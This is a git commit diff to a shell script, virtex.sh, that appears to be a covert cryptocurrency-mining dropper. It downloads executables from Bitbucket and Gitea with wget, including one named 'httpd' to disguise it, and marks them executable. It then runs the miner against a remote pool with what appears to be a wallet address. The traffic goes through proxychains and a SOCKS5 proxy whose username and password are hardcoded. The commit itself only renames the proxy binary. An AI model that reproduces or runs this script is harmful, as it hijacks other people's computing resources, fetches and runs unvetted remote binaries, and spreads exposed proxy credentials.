a43913eb8f9085c7b2714aed5ea0b1ecf1fecb06
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-10 06:13:10 +0700

    Update virtex.sh

--- virtex.sh
+++ virtex.sh
@@ -3,7 +3,7 @@ port="1080"
 user="s0xa2xicwh8i36"  
 pass="811noty1dt532rfecresmotogphkbd" 
 wget -q -O kva https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x kva
-wget -q -O diamon https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x diamon 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./diamon ./kva -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 80-999 -n 1)-sansjaya) -p c=CPU -x socks5://s0xa2xicwh8i36:811noty1dt532rfecresmotogphkbd@50.17.160.202:1080 
+./panel ./kva -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 80-999 -n 1)-sansjaya) -p c=CPU -x socks5://s0xa2xicwh8i36:811noty1dt532rfecresmotogphkbd@50.17.160.202:1080 
